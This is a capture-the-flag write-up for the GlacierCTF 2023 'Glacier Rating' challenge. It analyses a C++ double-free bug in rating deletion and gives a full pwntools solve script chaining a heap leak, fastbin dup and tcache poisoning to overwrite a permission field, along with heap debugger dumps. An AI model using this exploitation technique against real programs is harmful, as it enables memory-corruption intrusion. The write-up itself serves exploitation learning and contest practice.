# Glacier Rating

> Author: n4nika<br>
> Description: I love C++. No malloc and free, so I can't mess up my heap management, right?<br>
> Attachment: [glacie-rating.tar.gz](https://raw.githubusercontent.com/d0UBleW/ctf/main/glacier-23/pwn/glacier-rating/glacier-rating.tar.gz)<br>

<div class="hidden">
    keywords: GlacierCTF 2023, pwn, heap, cpp, tcache poisoning, double free, fastbin dup
</div>

## TL;DR

Double free into tcache poisoning

## Source Code Analysis

In this program, we are first required to provide a username and a password,
then we could interact with the main features of the program with `USER` level
permission:

- create a rating
- delete a rating
- show a rating
- scream
- do admin stuff, which prints out `flag.txt` (require `ADMIN` level permission)

#### user.hpp

```cpp
#ifndef USER_HPP
#define USER_HPP

#include <string>
#include <map>
#include <iostream>

enum class Perms
{
  ADMIN = 0,
  USER = 1000,
};

class User
{
  private:
    std::string username_;
    std::string password_;
    std::map<size_t, char*> ratings_;
    Perms user_level_;

  public:
    User(std::string username, std::string password, Perms user_level);
    ~User() = default;
    User(const User &copy) = delete;
    std::string getUsername();
    Perms getUserLevel();
    void insertRating(char *rating);
    void removeRating(size_t index);
    void showRatings();
};

#endif
```

### Create A Rating

Creating a rating would first allocate a `0x20` sized chunk on the heap, only then
followed by rating amount validation, which only allow us to create 3 ratings.
Our input is then used to create `std::pair` value and this pair is then inserted
into the `std::map<size_t, char*> ratings_`

```cpp
// main.cpp
void writeRating(User *user) {
    char *buffer = new char[24];

    std::cout << "Give me your rating" << std::endl;
    std::cout << "> ";
    fgets(buffer, 24, stdin);
    user->insertRating(buffer);
    return;
}

// user.cpp
void User::insertRating(char *rating) {
    if (ratings_.size() >= 3) {
        std::cout << "Maximum amount of ratings reached!" << std::endl;
        return;
    } else {
        ratings_.insert({ratings_.size() + 1, rating});
        std::cout << "Successfully added rating" << std::endl;
        return;
    }
}
```

### Delete A Rating

Deleting a rating seems to be straight forward, where we are required to choose
from the available `key` inside `ratings_`. Proper validation is implemented
as well to prevent weird interactions. However, there is one problem here. On
line `21`, the function `User::removeRating` does not actually delete the
`std::pair` element, but instead only delete the `std::pair` value. As a result,
the size of the `std::map` stays the same as well.

```cpp {linenos=table}
// main.cpp
void deleteRating(User *user) {
    size_t index = 0;
    std::cout << "Which rating do you want to remove?" << std::endl;
    std::cout << "> ";
    scanf("%zd", &index);
    getchar();
    user->removeRating(index);
    return;
}

// user.cpp
void User::removeRating(size_t index) {
    if (ratings_.empty()) {
        std::cout << "No ratings to delete" << std::endl;
        return;
    } else if (index >= ratings_.size() + 1 | index < 1) {
        std::cout << "Invalid Index" << std::endl;
        return;
    } else {
        delete ratings_.at(index); // <=== VULNERABILITY!!!
        std::cout << "Removed rating " << index << std::endl;
        return;
    }
}
```

Here is a rough visualization of what happen when we delete a rating:

```text
1: aaaa
2: bbbb
3: cccc

Delete `2` --> free bbbbb
1: aaaa
2: ????
3: cccc

Instead of
1: aaaa
3: cccc
```

With this wrong implementation, we are able to leak data from the heap
(through show rating), since the key `2` still exists inside `ratings_`

The proper way to delete should be using the [`erase` method](https://en.cppreference.com/w/cpp/container/map/erase).

### Show A Rating

Nothing much here, just a function to display `ratings_`.

```cpp
// main.cpp
void showRatings(User *user) {
    user->showRatings();
    return;
}

// user.cpp
void User::showRatings() {
    std::cout << "Your ratings: " << std::endl;
    for (auto rating : ratings_) {
        std::cout << rating.first << ": " << rating.second << std::endl;
    }
    return;
}
```

### Scream

This function allow us to temporarily create a vector which essentially give
us the ability to allocate up to 50 arbitrary size chunks. These chunks are then
**freed** when the vector object goes out of scope. We will get back to this
function when developing our exploit later on.

```cpp
// main.cpp
void scream(User *user) {
    std::cout << "Now scream to your hearts content!" << std::endl;
    std::string              line;
    std::vector<std::string> lines;
    while (line != "quit") {
        std::getline(std::cin, line);
        lines.push_back(line);

        if (lines.size() > 50) {
            std::cout << "Thats enough!" << std::endl;
            return;
        }
    }
    return;
}
```

### Do Admin Stuff

This is the function that would give us the flag given that our permission is 
`ADMIN`.

```cpp
// main.cpp
void doAdminStuff(User *user) {
    if (user->getUserLevel() != Perms::ADMIN) {
        std::cout << "You are not an admin!" << std::endl;
        exit(1);
    } else if (user->getUserLevel() == Perms::ADMIN) {
        std::ifstream flag_stream("./flag.txt");
        std::string   flag;
        std::getline(flag_stream, flag);
        flag_stream.close();
        std::cout << "Verified permissions" << std::endl;
        std::cout << "Here is your flag: " << flag << std::endl;
        exit(0);
    }
}
```

## Solution

### Getting A Heap Leak

From the analysis above, we found out that we could obtain a heap leak by
deleting a rating and show the rating.

```python
create(b"a" * 8)
show()
print(io.recvline())
print(io.recvline())

delete(1)
show()
print(io.recvline())
print(io.recvline())

"""
b'Your ratings: \n'
b'1: aaaaaaaa\n'
b'Your ratings: \n'
b'1: w\xa3c`\x05\n'
"""
```

### Fastbin Dup

What we could do next is to perform double free. However, this does not work
due to `tcachebins` mitigation. We could try to find a way to overwrite the `bk`
field which contain the key to prevent double free but this is not possible.
Unlike `tcachebins`, `fastbin` does not have the mechanism to detect double free.
So our goal now is to free the rating chunk into fastbin and perform double free
(also known as `fastbin dup`).

To achieve this, we would need to first fill up the `tcachebins` with chunks of size
`0x20`. Recall the `scream` function which enable us to allocate up to 50
arbitrary size chunks. Furthermore, this function also freed the allocated chunks
at the end, which is perfect for us.

```python
create(b"a" * 8)
create(b"b" * 8)
create(b"c" * 8)
delete(3)

show()
io.recvuntil(b"3: ")
heap_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")
heap = heap_leak << 12
log.info(f"{heap=:#x}")
user_chunk = heap + 0x370

# fill up tcachebins
payload = b"\n".join([cyclic(0x10)] * 7 + [b"quit"])
scream(payload)

# fastbin dup
delete(1)
delete(2)
delete(1) # <=== DOUBLE FREE!!!
```

Before scream
```console
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
tcachebins[idx=0, size=0x20, @0x555555563090] count=1
 -> Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=1, size=0x30, @0x555555563098] count=1
 -> Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2
 -> Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
[+] Found 4 chunks in tcache.
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
[+] Found 0 chunks in fastbin.
```

After scream
```console
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
tcachebins[idx=0, size=0x20, @0x555555563090] count=7
 -> Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=1, size=0x30, @0x555555563098] count=2
 -> Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2
 -> Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1
 -> Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=15, size=0x110, @0x555555563108] count=1
 -> Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
[+] Found 13 chunks in tcache.
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
[+] Found 0 chunks in fastbin.
```

Now, when we delete rating 1 and 2, both would go to `fastbin`.

```console
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
tcachebins[idx=0, size=0x20, @0x555555563090] count=7
 -> Chunk(addr=0x555555575800, size=0x20, flags=PREV_INUSE, fd=0x555000020285, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555757e0, size=0x20, flags=PREV_INUSE, fd=0x5550000202a5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555757c0, size=0x20, flags=PREV_INUSE, fd=0x5550000203d5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575690, size=0x20, flags=PREV_INUSE, fd=0x5550000203f5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575670, size=0x20, flags=PREV_INUSE, fd=0x5550000200a5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x5555555755c0, size=0x20, flags=PREV_INUSE, fd=0x555000020035, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575530, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=1, size=0x30, @0x555555563098] count=2
 -> Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2
 -> Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1
 -> Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=15, size=0x110, @0x555555563108] count=1
 -> Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
[+] Found 13 chunks in tcache.
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
fastbins[idx=0, size=0x20, @0x7ffff7c17ad0]
 -> Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a)
 -> Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x000555555575, bk=0x00000000000a)
[+] Found 2 chunks in fastbin.

```

Next, we trigger the double free by deleting rating 1.

```console
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
fastbins[idx=0, size=0x20, @0x7ffff7c17ad0]
 -> Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a)
 -> Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a)
 -> Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a)
 -> 0x555555575500 [loop detected]
[+] Found 2 chunks in fastbin.
```

### Tcache Poisoning

Now, when we request a `0x20` size chunk, it would first go through `tcachebins`
until it's empty. When we empty out the `tcachebins`, the next allocation request
would go to `fastbin` and the rest of the bins would be dumped into `tcachebins`.
But how do we empty out the `tcachebins`? Using `scream` is not ideal as
the chunks would get freed again. The answer is to simply create a rating.
This is because the allocation is done before the rating count validation check.

Before allocation request

```console
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
tcachebins[idx=1, size=0x30, @0x555555563098] count=2
 -> Chunk(addr=0x5555555752a0, size=0x30, flags=PREV_INUSE, fd=0x5550000200d5, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575590, size=0x30, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=3, size=0x50, @0x5555555630a8] count=2
 -> Chunk(addr=0x5555555752d0, size=0x50, flags=PREV_INUSE, fd=0x555000020645, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x555555575320, size=0x50, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=7, size=0x90, @0x5555555630c8] count=1
 -> Chunk(addr=0x5555555755e0, size=0x90, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
tcachebins[idx=15, size=0x110, @0x555555563108] count=1
 -> Chunk(addr=0x5555555756b0, size=0x110, flags=PREV_INUSE, fd=0x000555555575, bk=0x6ee603c65e3f27c0)
[+] Found 6 chunks in tcache.
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
fastbins[idx=0, size=0x20, @0x7ffff7c17ad0]
 -> Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a)
 -> Chunk(addr=0x555555575510, size=0x20, flags=PREV_INUSE, fd=0x555000020185, bk=0x00000000000a)
 -> Chunk(addr=0x5555555754f0, size=0x20, flags=PREV_INUSE, fd=0x555000020065, bk=0x00000000000a)
 -> 0x555555575500 [loop detected]
[+] Found 2 chunks in fastbin.
```

After allocation request: `0x560c41f0d4f0` is allocated, which is the first
free chunk in `fastbin`, and the remaining chunks are dumped into `tcachebins`.

```console
----------------------------------- Tcachebins for arena 'main_arena' -----------------------------------
tcachebins[idx=0, size=0x20, @0x560c41efb090] count=3
 -> Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x560c41f0d4f0, size=0x20, flags=PREV_INUSE, fd=0x56092134ca2d, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x560c41f0d510, size=0x20, flags=PREV_INUSE, fd=0x56092134ca0d, bk=0x6ee603c65e3f27c0)
 -> 0x560c41f0d520 [loop detected]two chunk
tcachebins[idx=1, size=0x30, @0x560c41efb098] count=2
 -> Chunk(addr=0x560c41f0d2a0, size=0x30, flags=PREV_INUSE, fd=0x56092134caad, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x560c41f0d590, size=0x30, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0)
tcachebins[idx=3, size=0x50, @0x560c41efb0a8] count=2
 -> Chunk(addr=0x560c41f0d2d0, size=0x50, flags=PREV_INUSE, fd=0x56092134cc3d, bk=0x6ee603c65e3f27c0)
 -> Chunk(addr=0x560c41f0d320, size=0x50, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0)
tcachebins[idx=7, size=0x90, @0x560c41efb0c8] count=1
 -> Chunk(addr=0x560c41f0d5e0, size=0x90, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0)
tcachebins[idx=15, size=0x110, @0x560c41efb108] count=1
 -> Chunk(addr=0x560c41f0d6b0, size=0x110, flags=PREV_INUSE, fd=0x000560c41f0d, bk=0x6ee603c65e3f27c0)
[+] Found 8 chunks in tcache.
------------------------------------ Fastbins for arena 'main_arena' ------------------------------------
[+] Found 0 chunks in fastbin.
gef> p $rax - 0x10
$1 = 0x560c41f0d4f0
```

Now that we received a chunk at `0x560c41f0d4f0`, while this chunk exists on
`tcachebins`, we could perform tcache poisoning to allocate a chunk where
we could overwrite our user permission level.

### Final Solve Script

```python
#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./app", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chall.glacierctf.com 13373"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


def create(rating: bytes):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"rating\n> ", rating)


def delete(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"remove?\n> ", str(idx).encode())


def show():
    io.sendlineafter(b"> ", b"3")


def scream(aaa: bytes):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"content!\n", aaa)


def admin():
    io.sendlineafter(b"> ", b"5")


def reveal(ptr):
    mask = 0xfff << 36
    while mask:
        ptr ^= (ptr & mask) >> 12
        mask >>= 12
    return ptr


def mangle(pos, ptr):
    return (pos >> 12) ^ ptr


env = {}
io = start()

io.sendlineafter(b"username: ", cyclic(0x30))
io.sendlineafter(b"password: ", cyclic(0x30))

create(b"a" * 8)
create(b"b" * 8)
create(b"c" * 8)
delete(3)

show()
io.recvuntil(b"3: ")
heap_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
log.info(f"{heap_leak=:#x}")
heap = heap_leak << 12
log.info(f"{heap=:#x}")
user_chunk = heap + 0x370

# Fill up tcachebins
payload = b"\n".join([cyclic(0x10)] * 7 + [b"quit"])
scream(payload)

# fastbin dup
delete(1)
delete(2)
delete(1)

# Empty out tcachebins
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)
create(b"f" * 8)

# After tcachebins is empty, the fastbins are dumped into tcachebins
# which enable us to do tcache poisoning with the fastbin dup earlier
fd = mangle(heap + 0x4f0, user_chunk + 0x80)  # perms field
create(p64(fd))
create(b"f" * 8)
create(b"f" * 8)
create(p64(0) + p64(0x41))
admin()

io.interactive()
```

```console
➜ ./solve.py REMOTE
[+] Opening connection to chall.glacierctf.com on port 13373: Done
[*] heap_leak=0x557c4b598
[*] heap=0x557c4b598000
[*] Switching to interactive mode
Verified permissions
Here is your flag: gctf{I_th0ght_1_c0uld_n0t_m3ss_4nyth1ng_up}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to chall.glacierctf.com port 13373
```
